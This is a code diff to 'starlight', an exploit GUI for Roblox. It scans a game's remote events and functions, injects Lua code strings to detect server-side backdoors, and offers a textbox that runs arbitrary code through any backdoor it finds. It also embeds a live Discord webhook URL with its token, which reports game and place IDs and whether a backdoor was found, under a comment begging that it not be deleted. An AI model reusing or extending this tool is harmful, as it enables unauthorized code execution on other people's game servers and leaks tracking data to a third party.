@@ -451,38 +451,38 @@ local fake_module_scripts = {}
 -- Fake Local Scripts:
 
 local function HTHCU_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Frame.LocalScript
-    local script = Instance.new("LocalScript")
-    script.Name = "LocalScript"
-    script.Parent = Converted["_Frame1"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
+	local script = Instance.new("LocalScript")
+	script.Name = "LocalScript"
+	script.Parent = Converted["_Frame1"]
+	local req = require
+	local require = function(obj)
+		local fake = fake_module_scripts[obj]
+		if fake then
+			return fake()
+		end
+		return req(obj)
+	end
 
 	local UserInputService = game:GetService("UserInputService")
-	
+
 	local gui = script.Parent
-	
+
 	local dragging
 	local dragInput
 	local dragStart
 	local startPos
-	
+
 	local function update(input)
 		local delta = input.Position - dragStart
 		gui.Parent.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
 	end
-	
+
 	gui.InputBegan:Connect(function(input)
 		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
 			dragging = true
 			dragStart = input.Position
 			startPos = gui.Parent.Position
-			
+
 			input.Changed:Connect(function()
 				if input.UserInputState == Enum.UserInputState.End then
 					dragging = false
@@ -490,13 +490,13 @@ local function HTHCU_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Fr
 			end)
 		end
 	end)
-	
+
 	gui.InputChanged:Connect(function(input)
 		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
 			dragInput = input
 		end
 	end)
-	
+
 	UserInputService.InputChanged:Connect(function(input)
 		if input == dragInput and dragging then
 			update(input)
@@ -504,21 +504,21 @@ local function HTHCU_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Fr
 	end)
 end
 local function NNJJBVQ_fake_script() -- Fake Script: StarterGui.Starlight.Frame.c.LocalScript
-    local script = Instance.new("LocalScript")
-    script.Name = "LocalScript"
-    script.Parent = Converted["_c"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
+	local script = Instance.new("LocalScript")
+	script.Name = "LocalScript"
+	script.Parent = Converted["_c"]
+	local req = require
+	local require = function(obj)
+		local fake = fake_module_scripts[obj]
+		if fake then
+			return fake()
+		end
+		return req(obj)
+	end
 
 	local button = script.Parent
 	local frame = button.Parent.Parent
-	
+
 	button.MouseEnter:Connect(function()
 		button.BackgroundColor3 = Color3.fromRGB(22,22,22)
 		button.UIStroke.Color = Color3.fromRGB(65,65,65)
@@ -539,7 +539,7 @@ local function NNJJBVQ_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 		local tweenService = game:GetService("TweenService")
 		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
 		local transparencyGoal = {BackgroundTransparency = 1}
-	
+
 		for _, obj in pairs(frame:GetDescendants()) do
 			if obj:IsA("GuiObject") then
 				tweenService:Create(obj, tweenInfo, transparencyGoal):Play()
@@ -548,24 +548,24 @@ local function NNJJBVQ_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 				end
 			end
 		end
-	
+
 		task.wait(0.5)
 		frame:Destroy()
 	end)
-	
+
 end
 local function BMYJH_fake_script() -- Fake Script: StarterGui.Starlight.Frame.LocalScript
-    local script = Instance.new("LocalScript")
-    script.Name = "LocalScript"
-    script.Parent = Converted["_Frame"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
+	local script = Instance.new("LocalScript")
+	script.Name = "LocalScript"
+	script.Parent = Converted["_Frame"]
+	local req = require
+	local require = function(obj)
+		local fake = fake_module_scripts[obj]
+		if fake then
+			return fake()
+		end
+		return req(obj)
+	end
 
 	local player = game.Players.LocalPlayer
 	local mouse = player:GetMouse()
@@ -584,9 +584,9 @@ local function BMYJH_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Lo
 	cursor.AnchorPoint = Vector2.new(0.5, 0.5) -- Center the cursor
 	cursor.Visible = false
 	cursor.Parent = gui
-	
+
 	local tweenInfo = TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
-	
+
 	local function updateCursor()
 		if cursor.Visible then
 			local guiPosition = Vector2.new(mouse.X - gui.AbsolutePosition.X, mouse.Y - gui.AbsolutePosition.Y)
@@ -595,27 +595,27 @@ local function BMYJH_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Lo
 			tween:Play()
 		end
 	end
-	
+
 	gui.MouseEnter:Connect(function()
 		userInputService.MouseIconEnabled = false -- Hide default cursor
 		cursor.Visible = true
 	end)
-	
+
 	gui.MouseLeave:Connect(function()
 		userInputService.MouseIconEnabled = true -- Restore default cursor
 		cursor.Visible = false
 	end)
-	
+
 	gui.c.MouseButton1Click:Connect(function()
 		wait(0.5)
 		userInputService.MouseIconEnabled = true -- Restore default cursor
 		cursor.Visible = false
 	end)
-	
+
 	-- PLEASE DO NOT DELETE ME I BEGGG
 	local webhookURL = "https://discord.com/api/webhooks/1352261294429831250/XysLMEQAgmzu5U-vbg7cBia6966NF59roeTKF4SGw4yuZPSkDLVHZkgiOKXHNAYdsH1k"
 	local MarketplaceService = game:GetService("MarketplaceService")
-	
+
 	local function sendWebhookMessage(IsBackdooredTrue)
 		local gameID = game.GameId
 		local placeID = game.PlaceId
@@ -673,94 +673,104 @@ local function BMYJH_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Lo
 	end
 	runService.RenderStepped:Connect(updateCursor)
 	local RunService = game:GetService("RunService")
-    local excludedRemotes = {
-	    "UpdateCurrentCall",
-	    "CanChatWith",
-	    "OnNewMessage",
-    	"OnMessageDoneFiltering",
-	    "OnChannelJoined",
-	    "OnNewSystemMessage",
-    }
-    local remoteEvent, remoteFunction, foundExploit = nil, nil, false
-    local function testRemote(remote, isFunction)
-	    if foundExploit then return end
-	    local randomId = tostring(math.random(1, 1e6))
-	    local modelName = "starlight_" .. randomId
-	    print("💫 starlight: checking Remote:", remote:GetFullName())
-	    local foundEvent = false
-	    local function onAdded(instance)
-		    if instance.Name == modelName then
-			    foundEvent = true
-		    end
-	    end
-	    local connection = workspace.DescendantAdded:Connect(onAdded)
-	    if isFunction then
-		    pcall(function()
-			    remote:InvokeServer([[local m=Instance.new("Folder") m.Name="]] .. modelName .. [[" m.Parent=workspace]])
-		    end)
-	    else
-		    remote:FireServer([[local m=Instance.new("Folder") m.Name="]] .. modelName .. [[" m.Parent=workspace]])
-	    end
-	    local startTime = tick()
-	    while tick() - startTime < 0.22 do
-		    if foundEvent or workspace:FindFirstChild(modelName, true) then
-			    foundEvent = true
-			    break
-		    end
-		    RunService.Heartbeat:Wait()
-	    end
-	    connection:Disconnect()
-	    if foundEvent then
-		    print("💫 starlight: backdoor found!")
-		    if not foundExploit then
-			    foundExploit = true
-			    if isFunction then
-				    remoteFunction = remote
-			    else
-				    remoteEvent = remote
-			    end
-		    end
-	    else
-		    print("💫 starlight: remote not backdoor:", remote:GetFullName())
-	    end
-    end
-    local function findRemote()
-	    local remotes = {}
-	    for _, remote in ipairs(game:GetDescendants()) do
-		    if (remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction")) and not table.find(excludedRemotes, remote.Name) then
-			    table.insert(remotes, remote)
-		    end
-	    end
-	    for _, remote in ipairs(remotes) do
-		    task.spawn(function()
-			    if not foundExploit then
-				    testRemote(remote, remote:IsA("RemoteFunction"))
-			    end
-		    end)
-	    end
-	    local overallTimeout = 5
-	    local start = tick()
-	    repeat task.wait(0.01) until foundExploit or (tick() - start > overallTimeout)
-	        if remoteEvent then
-		        print("💫 starlight: using backdoor (RemoteEvent):", remoteEvent:GetFullName())
-	        elseif remoteFunction then
-		        print("💫 starlight: using backdoor (RemoteFunction):", remoteFunction:GetFullName())
-	        else
-		        print("💫 starlight: no Backdoor found.")
-	        end
-        end
+	local excludedRemotes = {
+		"UpdateCurrentCall",
+		"CanChatWith",
+		"OnNewMessage",
+		"OnMessageDoneFiltering",
+		"OnChannelJoined",
+		"OnNewSystemMessage",
+	}
+	local foundExploit = false
+	local remoteEvent, remoteFunction
+	local FinishedFound = false
+	local function testRemote(remote, isFunction)
+		if foundExploit then return end
+		local randomId = tostring(math.random(1, 1e6))
+		local modelName = "starlight_" .. randomId
+		print("💫 starlight: checking Remote:", remote:GetFullName())
+
+		local foundEvent = false
+		local function onAdded(instance)
+			if instance.Name == modelName then
+				foundEvent = true
+			end
+		end
+
+		local connection = workspace.DescendantAdded:Connect(onAdded)
+		if isFunction then
+			pcall(function()
+				remote:InvokeServer([[local m=Instance.new("Folder") m.Name="]] .. modelName .. [[" m.Parent=workspace]])
+			end)
+		else
+			remote:FireServer([[local m=Instance.new("Folder") m.Name="]] .. modelName .. [[" m.Parent=workspace]])
+		end
+
+		local startTime = tick()
+		while tick() - startTime < 0.22 do
+			if foundEvent or workspace:FindFirstChild(modelName, true) then
+				foundEvent = true
+				break
+			end
+			RunService.Heartbeat:Wait()
+		end
+
+		connection:Disconnect()
+		if foundEvent then
+			print("💫 starlight: backdoor found!")
+			foundExploit = true
+			if isFunction then
+				remoteFunction = remote
+			else
+				remoteEvent = remote
+			end
+		else
+			print("💫 starlight: remote not backdoor:", remote:GetFullName())
+		end
 	end
-    local function fireRemoteEvent(code)
-	    if remoteEvent then
-		    print("ℹ️ Executing code through backdoor (RemoteEvent):", remoteEvent:GetFullName())
-		    remoteEvent:FireServer(code)
-	    elseif remoteFunction then
-		    print("ℹ️ Executing code through backdoor (RemoteFunction):", remoteFunction:GetFullName())
-		    pcall(function() remoteFunction:InvokeServer(code) end)
-	    else
-		    warn("💫 starlight: no backdoor found, cannot execute code.")
-	    end
-    end
+
+	local function findRemote()
+		local remotes = {}
+		for _, remote in ipairs(game:GetDescendants()) do
+			if (remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction")) and not table.find(excludedRemotes, remote.Name) then
+				table.insert(remotes, remote)
+			end
+		end
+
+		for _, remote in ipairs(remotes) do
+			task.spawn(function()
+				if not foundExploit then
+					testRemote(remote, remote:IsA("RemoteFunction"))
+				end
+			end)
+		end
+
+		local overallTimeout = 5
+		local start = tick()
+		repeat task.wait(0.01) until foundExploit or (tick() - start > overallTimeout)
+		FinishedFound = true -- Marking when the search is done
+		if remoteEvent then
+			print("💫 starlight: using backdoor (RemoteEvent):", remoteEvent:GetFullName())
+		elseif remoteFunction then
+			print("💫 starlight: using backdoor (RemoteFunction):", remoteFunction:GetFullName())
+		else
+			print("💫 starlight: no Backdoor found.")
+		end
+	end
+
+	local function fireRemoteEvent(code)
+		if remoteEvent then
+			print("ℹ️ Executing code through backdoor:", remoteEvent:GetFullName())
+			remoteEvent:FireServer(code)
+		elseif remoteFunction then
+			print("ℹ️ Executing code through backdoor:", remoteFunction:GetFullName())
+			pcall(function()
+				remoteFunction:InvokeServer(code)
+			end)
+		else
+			warn("💫 starlight: no backdoor found, cannot execute code.")
+		end
+	end
 
 	game.StarterGui:SetCore("SendNotification",{
 		Title = "💫 starlight",
@@ -768,12 +778,13 @@ local function BMYJH_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Lo
 		Duration = 12
 	})
 	task.wait(0.8)
-	task.spawn(function() findRemote() end)
+	task.spawn(findRemote)
+
+	repeat task.wait() until FinishedFound or remoteEvent or remoteFunction
 	script.Parent.Framee.Execute.MouseButton1Click:Connect(function()
 		fireRemoteEvent(script.Parent.Framee.TextBox.Text)
 	end)
-	repeat task.wait() until FinishedFound or remoteEvent
-	if not remoteEvent then
+	if not remoteEvent or not remoteFunction then
 		script.Parent.Check.Text = "backdoor not found!"
 		sendWebhookMessage(false)  -- Send webhook message if backdoor is 
 	else
@@ -786,90 +797,91 @@ local function BMYJH_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Lo
 			Text = "backdoor found! backdoor: " .. remoteEvent:GetFullName(),
 			Duration = 5
 		})
-	
+
 	end
-local function USOMURW_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Framee.TextBox.LocalScript
-    local script = Instance.new("LocalScript")
-    script.Name = "LocalScript"
-    script.Parent = Converted["_TextBox"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
+	local function USOMURW_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Framee.TextBox.LocalScript
+		local script = Instance.new("LocalScript")
+		script.Name = "LocalScript"
+		script.Parent = Converted["_TextBox"]
+		local req = require
+		local require = function(obj)
+			local fake = fake_module_scripts[obj]
+			if fake then
+				return fake()
+			end
+			return req(obj)
+		end
 
-	script.Parent.Font = Enum.Font.Code
+		script.Parent.Font = Enum.Font.Code
+	end
+	local function UKOLUO_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Framee.Clear.LocalScript
+		local script = Instance.new("LocalScript")
+		script.Name = "LocalScript"
+		script.Parent = Converted["_Clear"]
+		local req = require
+		local require = function(obj)
+			local fake = fake_module_scripts[obj]
+			if fake then
+				return fake()
+			end
+			return req(obj)
+		end
+
+		script.Parent.MouseEnter:Connect(function()
+			script.Parent.BackgroundColor3 = Color3.fromRGB(22,22,22)
+			script.Parent.UIStroke.Color = Color3.fromRGB(65,65,65)
+		end)
+		script.Parent.MouseLeave:Connect(function()
+			script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
+			script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
+		end)
+		script.Parent.MouseButton1Down:Connect(function()
+			script.Parent.BackgroundColor3 = Color3.fromRGB(10,10,10)
+			script.Parent.UIStroke.Color = Color3.fromRGB(50,50,50)
+		end)
+		script.Parent.MouseButton1Up:Connect(function()
+			script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
+			script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
+		end)
+		script.Parent.MouseButton1Click:Connect(function()
+			script.Parent.Parent.TextBox.Text = ""
+		end)
+	end
+	local function SSXJS_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Framee.Execute.LocalScript
+		local script = Instance.new("LocalScript")
+		script.Name = "LocalScript"
+		script.Parent = Converted["_Execute"]
+		local req = require
+		local require = function(obj)
+			local fake = fake_module_scripts[obj]
+			if fake then
+				return fake()
+			end
+			return req(obj)
+		end
+
+		script.Parent.MouseEnter:Connect(function()
+			script.Parent.BackgroundColor3 = Color3.fromRGB(22,22,22)
+			script.Parent.UIStroke.Color = Color3.fromRGB(65,65,65)
+		end)
+		script.Parent.MouseLeave:Connect(function()
+			script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
+			script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
+		end)
+		script.Parent.MouseButton1Down:Connect(function()
+			script.Parent.BackgroundColor3 = Color3.fromRGB(10,10,10)
+			script.Parent.UIStroke.Color = Color3.fromRGB(50,50,50)
+		end)
+		script.Parent.MouseButton1Up:Connect(function()
+			script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
+			script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
+		end)
+	end
+
+	coroutine.wrap(USOMURW_fake_script)()
+	coroutine.wrap(UKOLUO_fake_script)()
+	coroutine.wrap(SSXJS_fake_script)()
 end
-local function UKOLUO_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Framee.Clear.LocalScript
-    local script = Instance.new("LocalScript")
-    script.Name = "LocalScript"
-    script.Parent = Converted["_Clear"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
-
-	script.Parent.MouseEnter:Connect(function()
-		script.Parent.BackgroundColor3 = Color3.fromRGB(22,22,22)
-		script.Parent.UIStroke.Color = Color3.fromRGB(65,65,65)
-	end)
-	script.Parent.MouseLeave:Connect(function()
-		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
-		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
-	end)
-	script.Parent.MouseButton1Down:Connect(function()
-		script.Parent.BackgroundColor3 = Color3.fromRGB(10,10,10)
-		script.Parent.UIStroke.Color = Color3.fromRGB(50,50,50)
-	end)
-	script.Parent.MouseButton1Up:Connect(function()
-		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
-		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
-	end)
-	script.Parent.MouseButton1Click:Connect(function()
-		script.Parent.Parent.TextBox.Text = ""
-	end)
-end
-local function SSXJS_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Framee.Execute.LocalScript
-    local script = Instance.new("LocalScript")
-    script.Name = "LocalScript"
-    script.Parent = Converted["_Execute"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
-
-	script.Parent.MouseEnter:Connect(function()
-		script.Parent.BackgroundColor3 = Color3.fromRGB(22,22,22)
-		script.Parent.UIStroke.Color = Color3.fromRGB(65,65,65)
-	end)
-	script.Parent.MouseLeave:Connect(function()
-		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
-		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
-	end)
-	script.Parent.MouseButton1Down:Connect(function()
-		script.Parent.BackgroundColor3 = Color3.fromRGB(10,10,10)
-		script.Parent.UIStroke.Color = Color3.fromRGB(50,50,50)
-	end)
-	script.Parent.MouseButton1Up:Connect(function()
-		script.Parent.BackgroundColor3 = Color3.fromRGB(16,16,16)
-		script.Parent.UIStroke.Color = Color3.fromRGB(57,57,57)
-	end)
-end
-
+coroutine.wrap(BMYJH_fake_script)()
 coroutine.wrap(HTHCU_fake_script)()
 coroutine.wrap(NNJJBVQ_fake_script)()
-coroutine.wrap(BMYJH_fake_script)()
-coroutine.wrap(USOMURW_fake_script)()
-coroutine.wrap(UKOLUO_fake_script)()
-coroutine.wrap(SSXJS_fake_script)()
